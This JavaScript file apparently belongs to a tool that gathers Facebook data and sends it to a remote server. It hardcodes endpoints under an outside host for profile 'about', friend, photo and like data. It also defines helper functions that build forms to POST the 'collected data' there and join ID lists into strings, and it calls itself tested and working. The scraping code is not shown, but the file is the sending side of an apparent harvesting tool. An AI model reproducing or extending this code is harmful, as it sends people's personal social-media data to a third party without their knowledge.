/*	Fonctions for creating form from sending the collected data to the server

	By nyradr : nyradr@protonmail.com
	
	TODO	: None
	
	STATS	: Tested (Work)
*/

var fb_send_servUrl = "http://wprj.site90.com/trrk/send/fb/";

var fb_send_about = fb_send_servUrl + "about.php";
var fb_send_friend = fb_send_servUrl + "friend.php";
var fb_send_photo = fb_send_servUrl + "photo.php";
var fb_send_like = fb_send_servUrl + "like.php";

//Create input element for sending the informations to the server
function send_CreateInput(name, val){
	var inp = document.createElement("input");
	inp.setAttribute("type", "text");
	inp.setAttribute("name", name);
	inp.setAttribute("value", val);
	
	return inp;
}

function send_CreateSubmit(){
	var sub = document.createElement("input");
	sub.setAttribute("type", "submit");
	sub.setAttribute("name", "sub");
	sub.setAttribute("value", "Submit");
	
	return sub;
}

function send_CreateForm(url){
	var form = document.createElement("form");
	form.setAttribute("method", "post");
	form.setAttribute("action", url);
	
	return form;
}

// transform list of id to string
function listToString(list){
	var str = "";
	
	for(var i = 0; i < list.length; i++){
		if(i > 0)
			str += "\\";
		str += list[i];
	}
		
	return str;
}



//alert("sendload");
